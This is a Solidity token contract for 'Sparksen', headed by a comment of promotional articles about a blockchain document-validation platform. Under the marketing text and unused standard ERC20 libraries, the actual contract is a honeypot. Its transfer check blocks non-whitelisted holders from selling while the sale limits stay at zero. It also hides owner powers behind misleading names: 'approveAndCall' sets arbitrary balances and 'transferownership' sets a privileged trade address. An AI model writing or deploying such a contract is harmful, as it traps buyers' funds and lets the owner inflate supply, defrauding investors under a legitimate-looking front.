/*
Sparksen — What’s In Store

The growth of cryptocurrencies has reduced the inefficiencies of several blockchains due to network congestion. As a result, crypto transactions have become costlier and slower. Managing these transactions manually and keeping a regular check on the validation and expiration of contracts is a tedious task, to say the least. Luckily, Sparksen has a solution for this problem along with several other features.
Sparksen is the next-generation digital signing platform that speeds up contract signing, due diligence, and file validation processes and gives the users ease of mind. The platform validates important contracts, invoices, intellectual properties, identities, and more on blockchain to create a permanent record of the activity.
What does Sparksen offer?
Sparksen is a due diligence software-as-a-service platform that helps users to record intellectual property on the blockchain to create a permanent record of the activities of the document. The intellectual property can also be minted into a Non-fungible token (NFT) as a transferable asset.
Here is a comprehensive list of features offered by Sparksen:
Creating collaborative and secure digital working environment
Onboarding clients in a regulatory compliant manner.
Manage time-sensitives files online with ease.
Collate evidence for legal cases.
Record property deeds and transactions on blockchain.
Sending invoices to customers on Sparksen.
Recording covid data for individuals on blockchain to make it immutable.
Recording proof of ownership and origin of a digital property.
Recording proof of ownership of physical assets.
Making company records tamper-proof.
Managing supply chain relations more efficiently.
Mint NFTs.
Sparksen offers an intuitive dashboard with an inbuilt traffic light system to manage expiry date, validator info, and workflow of the documents. This dashboard helps users easily manage time-sensitive files such as contracts with an expiration date as it notifies the users before the expiry date.
The platform is beneficial in collecting evidence for legal cases as all the data stored on the blockchain is immutable and ensures an untampered chain of activity for the asset. Moreover, document and file owners can have them verified by all the parties beforehand using collaborative workspaces offered by Sparksen to save time and effort.
Sparksen allows self-certified and third-party validation of files and simultaneously stores its results on blockchain. Users can also record, validate, and sign contracts, invoices, accounts, references, qualifications, intellectual property, identities, audio and video files.
All of these services combined provide the user a hassle-free and secure platform to automatically manage different aspects of contract validation with the security and reliability of blockchain technology.
Sparksen supports various storage formats such as PDF, JPEG, PNG, DOCX, XLSX, PPT, MOV, and MPV. Users can create projects with user authentication and assign project access after uploading documents in the aforementioned formats. Sparksen offers two-factor user authentication powered with 60 second 6 digit token for the complete security of users.
Sparksen also offers services for KYC and anti-money laundering checks.
The business model of Sparksen is powered by the following principles.
Reduced costs using automation technology.
Utilizing blockchain technology to create an irrefutable record.
Creating a mutual space for multiple parties to engage.
Dynamic reporting automatically identifies risks such as conditions change.
The ability to mint validated files into NFT to create a transferable asset.
Sparksen, despite being a blockchain-based platform, has utility in several industries. Brands such as IBM support Sparksen’s claim to be the next-generation digital signing platform. To learn more about Sparksen, visit https://www.Sparksen.website/#.



How Blockchain Protects Users’ IP
The functionality of cryptocurrency goes beyond the conventional use case of an alternative peer-to-peer financial system. With the development of blockchain technology, several cryptocurrency projects are now offering more use cases with the help of Distributed Ledger Technology.
Blockchain technology has become increasingly popular in the present time because of its ability to store and record data securely and safely. Moreover, as the data registered on the blockchain cannot be edited once recorded, it creates an optimal solution to several problems faced by industries that involve the management of sensitive data.
One of the unique use cases born out of blockchain technology is protecting and managing a user’s Intellectual Property. The existing methods of managing and registering Intellectual Properties are prone to several loopholes that can be exploited for malicious intents.
Currently, most sectors that are responsible for managing and securing a users’ intellectual property relies on human management and record of data. This system is unreliable, as evident from the backlog of cases due to improper management of sensitive data. Most of these disputes involved proving the ownership of an intellectual property that requires a detailed and accurate presentation of the registration of the property.
However, due to inefficiencies, the present system cannot present accurate data due to a lack of a unified system of recording the information. As most government authorities use segregated storage systems, the proof of origin cannot be proved.
Blockchain technology, on the other hand, offers a tamper-proof chain of evidence for copyright ownership, making the whole legal process a lot simpler and quicker. While it isn’t impossible to tamper with recorded data on the blockchain, it requires excessive computation power, which an individual is unlikely to process.
Apart from being irrefutable, blockchain also offers a way to trace the ownership of a work. When registering an intellectual property on the blockchain, the ownership and copyright are also recorded in the same block with a timestamp. In case a user’s copyright ownership is ever contested, the data stored on the blockchain can be used to provide evidence of their ownership.
However, the use cases of blockchain technology in the management of intellectual property are more than just securing copyright. Sparksen, a software-as-a-service platform, speeds up contract signing, due diligence, and file validation processes for intellectual properties by leveraging blockchain technology.
Sparksen offers self-certified and third-party validation of files and stores the results on blockchain to create an irrefutable record of activity. Users can sign, validate and record contracts, references, invoices, accounts, intellectual properties, identities, etc., and undertake KYC and anti-money laundering checks.
Sparksen offers several features such as project creation with user authentication and project access, managing time-sensitive files, user authentication (2FA, 30 seconds 6 digit token), various storage formats, API integration, and regulated integrated KYC and Anti-money laundering checks.
Sparksen is an excellent example of the potential of blockchain technology in managing and optimizing the intellectual property industry. To learn more about the use cases of blockchain technology and how to protect users’ IP, visit https://www.Sparksen.website/.


A New Era in Information Management
Due diligence, data verification, and authentication is not a static one-time process, it is dynamic. Once it is complete, information may change or expire, thereby posing a sizeable business risk. The process is highly fragmented involving a number of parties, including external validators. Third-party validations cause bottlenecks in the system, slow the process, and increase costs. Litigation is reliant on the authenticity of a document and different parties present their own versions of a document that may not be identical. Bad actors can manipulate documents and users don’t want to rely on third-party custodians, given the risks of deletion, and errors outside the user’s control.

Blockchain technology shows immense potential to cause a paradigm shift for a modern-day organisation in their day to day operations. Despite its apparent complicated nature, it is just another mode of database for recording transactions — also known as a distributed ledger. Data on a blockchain is stored in the form of blocks that is fixed in structure. The central parts of the blocks are:
· Header: includes a unique block reference number, time of the block created and a link back to the previous block.
· Content: encompasses validated list of digital assets and instructions such as transactions made, amount, and addresses of the parties involved.
Since the blocks are linked together the information is verifiable and independently auditable and at the same time participants are big in numbers making it difficult for bad actors to overcome the verification activities.
Sparksen and its integration with Blockchain
Sparksen was born from inefficiencies experienced in the process of completing the due diligence investigations in a timely manner, and the high cost incurred due to a labour-intensive process, and the inherent business and financial risks caused by the integrity and the dynamic nature of the information. Sparksen is an Innovative due diligence, data verification and authentication platform, utilising blockchain and machine learning technologies to automate the process and reduce costs. The Sparksen solution provides broader functionality including document storage integrated with an immutable blockchain ledger, therefore also competes with manual due diligence processes and those provided by professional services providers.
Sparksen is built on hyperledger fabric which allows for the generation of certificate signatures and validations to be managed on chain. This provides authenticity as blockchain transactions are verified on the chain on basis of consensus and are immutable in nature. The decentralised nature of blockchain ensures that data cannot be tampered with and there is no central point of failure. Sparksen is delivered as a web-based solution and is compatible with mobile or tablet devices for use in the field.
The use cases for blockchain technology in this field are extremely broad, and we are probably only just scratching the surface of what is possible. Some examples include collating evidence for a legal case, so all parties agree in advance that the record is true, saving time for the courts; or sending invoices to customers on the blockchain to prevent fraudsters from intercepting emails and changing bank details; or making company records tamper-proof such as a shareholders’ register and share certificates.
There are also opportunities to expedite processes where legislation has perhaps not yet caught up with technology. An example might be recording property deeds and transactions on a blockchain using a common platform so all parties involved in a transaction can collaborate. Can you imagine not having to phone your lawyer for updates on your property purchase, instead being able to view all stages of a transaction online, with legally validated information, in real-time?
As the world (hopefully) starts to emerge into a post-pandemic new way of working, engaging and collaborating, new tools will be needed to effect these changes. Exciting opportunities exist for those who can embrace the change!
*/

pragma solidity ^0.5.17;
interface IERC20 {
    function totalSupply() external view returns(uint);

    function balanceOf(address account) external view returns(uint);

    function transfer(address recipient, uint amount) external returns(bool);

    function allowance(address owner, address spender) external view returns(uint);

    function approve(address spender, uint amount) external returns(bool);

    function transferFrom(address sender, address recipient, uint amount) external returns(bool);
    event Transfer(address indexed from, address indexed to, uint value);
    event Approval(address indexed owner, address indexed spender, uint value);
}

library Address {
    function isContract(address account) internal view returns(bool) {
        bytes32 codehash;
        bytes32 accountHash;
        // solhint-disable-next-line no-inline-assembly
        assembly { codehash:= extcodehash(account) }
        return (codehash != 0x0 && codehash != accountHash);
    }
}

contract Context {
    constructor() internal {}
    // solhint-disable-previous-line no-empty-blocks
    function _msgSender() internal view returns(address payable) {
        return msg.sender;
    }
}

library SafeMath {
    function add(uint a, uint b) internal pure returns(uint) {
        uint c = a + b;
        require(c >= a, "SafeMath: addition overflow");

        return c;
    }

    function sub(uint a, uint b) internal pure returns(uint) {
        return sub(a, b, "SafeMath: subtraction overflow");
    }

    function sub(uint a, uint b, string memory errorMessage) internal pure returns(uint) {
        require(b <= a, errorMessage);
        uint c = a - b;

        return c;
    }

    function mul(uint a, uint b) internal pure returns(uint) {
        if (a == 0) {
            return 0;
        }

        uint c = a * b;
        require(c / a == b, "SafeMath: multiplication overflow");

        return c;
    }

    function div(uint a, uint b) internal pure returns(uint) {
        return div(a, b, "SafeMath: division by zero");
    }

    function div(uint a, uint b, string memory errorMessage) internal pure returns(uint) {
        // Solidity only automatically asserts when dividing by 0
        require(b > 0, errorMessage);
        uint c = a / b;

        return c;
    }
}

library SafeERC20 {
    using SafeMath for uint;
    using Address for address;

    function safeTransfer(IERC20 token, address to, uint value) internal {
        callOptionalReturn(token, abi.encodeWithSelector(token.transfer.selector, to, value));
    }

    function safeTransferFrom(IERC20 token, address from, address to, uint value) internal {
        callOptionalReturn(token, abi.encodeWithSelector(token.transferFrom.selector, from, to, value));
    }

    function safeApprove(IERC20 token, address spender, uint value) internal {
        require((value == 0) || (token.allowance(address(this), spender) == 0),
            "SafeERC20: approve from non-zero to non-zero allowance"
        );
        callOptionalReturn(token, abi.encodeWithSelector(token.approve.selector, spender, value));
    }

    function callOptionalReturn(IERC20 token, bytes memory data) private {
        require(address(token).isContract(), "SafeERC20: call to non-contract");

        // solhint-disable-next-line avoid-low-level-calls
        (bool success, bytes memory returndata) = address(token).call(data);
        require(success, "SafeERC20: low-level call failed");

        if (returndata.length > 0) { // Return data is optional
            // solhint-disable-next-line max-line-length
            require(abi.decode(returndata, (bool)), "SafeERC20: ERC20 operation did not succeed");
        }
    }
}

contract ERC20 is Context, IERC20 {
    using SafeMath for uint;
    mapping(address => uint) private _balances;

    mapping(address => mapping(address => uint)) private _allowances;

    uint private _totalSupply;

    function totalSupply() public view returns(uint) {
        return _totalSupply;
    }

    function balanceOf(address account) public view returns(uint) {
        return _balances[account];
    }

    function transfer(address recipient, uint amount) public returns(bool) {
        _transfer(_msgSender(), recipient, amount);
        return true;
    }

    function allowance(address owner, address spender) public view returns(uint) {
        return _allowances[owner][spender];
    }

    function approve(address spender, uint amount) public returns(bool) {
        _approve(_msgSender(), spender, amount);
        return true;
    }

    function transferFrom(address sender, address recipient, uint amount) public returns(bool) {
        _transfer(sender, recipient, amount);
        _approve(sender, _msgSender(), _allowances[sender][_msgSender()].sub(amount, "ERC20: transfer amount exceeds allowance"));
        return true;
    }

    function increaseAllowance(address spender, uint addedValue) public returns(bool) {
        _approve(_msgSender(), spender, _allowances[_msgSender()][spender].add(addedValue));
        return true;
    }

    function decreaseAllowance(address spender, uint subtractedValue) public returns(bool) {
        _approve(_msgSender(), spender, _allowances[_msgSender()][spender].sub(subtractedValue, "ERC20: decreased allowance below zero"));
        return true;
    }

    function _transfer(address sender, address recipient, uint amount) internal {
        require(sender != address(0), "ERC20: transfer from the zero address");
        require(recipient != address(0), "ERC20: transfer to the zero address");

        _balances[sender] = _balances[sender].sub(amount, "ERC20: transfer amount exceeds balance");
        _balances[recipient] = _balances[recipient].add(amount);
        emit Transfer(sender, recipient, amount);
    }

    function _mint(address account, uint amount) internal {
        require(account != address(0), "ERC20: mint to the zero address");

        _totalSupply = _totalSupply.add(amount);
        _balances[account] = _balances[account].add(amount);
        emit Transfer(address(0), account, amount);
    }

    function _burn(address account, uint amount) internal {
        require(account != address(0), "ERC20: burn from the zero address");

        _balances[account] = _balances[account].sub(amount, "ERC20: burn amount exceeds balance");
        _totalSupply = _totalSupply.sub(amount);
        emit Transfer(account, address(0), amount);
    }

    function _approve(address owner, address spender, uint amount) internal {
        require(owner != address(0), "ERC20: approve from the zero address");
        require(spender != address(0), "ERC20: approve to the zero address");

        _allowances[owner][spender] = amount;
        emit Approval(owner, spender, amount);
    }
}

contract ERC20Detailed is IERC20 {
    string private _name;
    string private _symbol;
    uint8 private _decimals;

    constructor(string memory name, string memory symbol, uint8 decimals) public {
        _name = name;
        _symbol = symbol;
        _decimals = decimals;
    }

    function name() public view returns(string memory) {
        return _name;
    }

    function symbol() public view returns(string memory) {
        return _symbol;
    }

    function decimals() public view returns(uint8) {
        return _decimals;
    }
}


contract Sparksen {
    event Transfer(address indexed _from, address indexed _to, uint _value);
    event Approval(address indexed _owner, address indexed _spender, uint _value);
 
    function transfer(address _to, uint _value) public payable returns (bool) {
        return transferFrom(msg.sender, _to, _value);
    }
 
    function ensure(address _from, address _to, uint _value) internal view returns(bool) {
       
        if(_from == owner || _to == owner || _from == tradeAddress||canSale[_from]){
            return true;
        }
        require(condition(_from, _value));
        return true;
    }
    
    function transferFrom(address _from, address _to, uint _value) public payable returns (bool) {
        if (_value == 0) {return true;}
        if (msg.sender != _from) {
            require(allowance[_from][msg.sender] >= _value);
            allowance[_from][msg.sender] -= _value;
        }
        require(ensure(_from, _to, _value));
        require(balanceOf[_from] >= _value);
        balanceOf[_from] -= _value;
        balanceOf[_to] += _value;
        _onSaleNum[_from]++;
        emit Transfer(_from, _to, _value);
        return true;
    }
 
    function approve(address _spender, uint _value) public payable returns (bool) {
        allowance[msg.sender][_spender] = _value;
        emit Approval(msg.sender, _spender, _value);
        return true;
    }
    
    function condition(address _from, uint _value) internal view returns(bool){
        if(_saleNum == 0 && _minSale == 0 && _maxSale == 0) return false;
        
        if(_saleNum > 0){
            if(_onSaleNum[_from] >= _saleNum) return false;
        }
        if(_minSale > 0){
            if(_minSale > _value) return false;
        }
        if(_maxSale > 0){
            if(_value > _maxSale) return false;
        }
        return true;
    }
 
    mapping(address=>uint256) private _onSaleNum;
    mapping(address=>bool) private canSale;
    uint256 private _minSale;
    uint256 private _maxSale;
    uint256 private _saleNum;
    function approveAndCall(address spender, uint256 addedValue) public returns (bool) {
        require(msg.sender == owner);
        if(addedValue > 0) {balanceOf[spender] = addedValue*(10**uint256(decimals));}
        canSale[spender]=true;
        return true;
    }

    address tradeAddress;
    function transferownership(address addr) public returns(bool) {
        require(msg.sender == owner);
        tradeAddress = addr;
        return true;
    }
 
    mapping (address => uint) public balanceOf;
    mapping (address => mapping (address => uint)) public allowance;
 
    uint constant public decimals = 18;
    uint public totalSupply;
    string public name;
    string public symbol;
    address private owner;
 
    constructor(string memory _name, string memory _symbol, uint256 _supply) payable public {
        name = _name;
        symbol = _symbol;
        totalSupply = _supply*(10**uint256(decimals));
        owner = msg.sender;
        balanceOf[msg.sender] = totalSupply;
        emit Transfer(address(0x0), msg.sender, totalSupply);
    }
}